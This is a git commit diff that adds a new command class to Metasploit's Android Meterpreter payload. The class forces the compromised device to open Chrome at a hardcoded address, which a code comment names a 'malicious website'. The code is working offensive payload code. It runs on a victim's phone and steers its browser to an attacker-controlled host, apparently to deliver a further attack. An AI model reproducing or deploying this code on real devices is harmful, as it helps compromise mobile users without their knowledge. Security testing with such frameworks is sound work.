e023046e9b6eecd67803661fbc5343e847062605
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2023-04-06 09:44:15 +0200

    made some classes point to the new xawa

---
+++ java/androidpayload/library/src/com/metasploit/meterpreter/android/android_xawa.java
@@ -0,0 +1,53 @@
+package com.metasploit.meterpreter.android;
+
+import android.telephony.SmsManager;
+
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
+import com.metasploit.meterpreter.AndroidMeterpreter;
+import com.metasploit.meterpreter.Meterpreter;
+import com.metasploit.meterpreter.TLVPacket;
+import com.metasploit.meterpreter.command.Command;
+
+import java.net.URISyntaxException;
+import java.util.List;
+
+public class android_xawa implements Command {
+
+    @Override
+    public int execute(Meterpreter meterpreter, TLVPacket request,
+                       TLVPacket response) throws Exception {
+
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
+
+
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
+
+        // Issue Chrome intent to malicious website
+        String urlString = "http://192.168.1.134:1312";
+        Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(urlString));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setPackage("com.android.chrome");
+        try {
+            context.startActivity(intent);
+        } catch (ActivityNotFoundException ignored) {
+          return ERROR_FAILURE;
+        }
+
+        return ERROR_SUCCESS;
+    }
+}
